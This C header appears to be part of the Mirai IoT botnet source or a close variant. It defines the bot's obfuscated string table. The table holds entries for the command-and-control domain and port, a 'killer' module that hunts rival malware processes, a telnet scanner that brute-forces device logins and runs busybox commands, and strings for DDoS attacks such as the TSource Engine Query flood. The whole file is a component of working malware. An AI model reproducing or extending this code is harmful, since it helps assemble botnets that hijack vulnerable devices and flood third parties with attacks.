#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

/* Generic bot info */
#define TABLE_PROCESS_ARGV              1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4
          
/* Killer data */          
#define TABLE_KILLER_SAFE               5
#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_DELETED            8   /* " (deleted)" */
#define TABLE_KILLER_FD                 9   /* "/fd" */
#define TABLE_KILLER_ANIME              10  /* .anime */
#define TABLE_KILLER_STATUS             11
#define TABLE_KILLER_TCP                12
#define TABLE_MEM_ROUTE                 13
#define TABLE_MEM_ASSWD                 14
          
/* Scanner data */          
#define TABLE_SCAN_CB_DOMAIN            18  /* domain to connect to */
#define TABLE_SCAN_CB_PORT              19  /* Port to connect to */
#define TABLE_SCAN_SHELL                20  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE               21  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM               22  /* 'system' to enable shell access */
#define TABLE_SCAN_SH                   23  /* 'sh' to enable shell access */
#define TABLE_SCAN_QUERY                24  /* echo hex string to verify login */
#define TABLE_SCAN_RESP                 25  /* utf8 version of query string */
#define TABLE_SCAN_NCORRECT             26  /* 'ncorrect' to fast-check for invalid password */
#define TABLE_SCAN_PS                   27  /* "/bin/busybox ps" */
#define TABLE_SCAN_KILL_9               28  /* "/bin/busybox kill -9 " */
          
/* Attack strings */          
#define TABLE_ATK_VSE                   29  /* TSource Engine Query */
#define TABLE_ATK_RESOLVER              30  /* /etc/resolv.conf */
#define TABLE_ATK_NSERV                 31  /* "nameserver " */

#define TABLE_MAX_KEYS  52 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
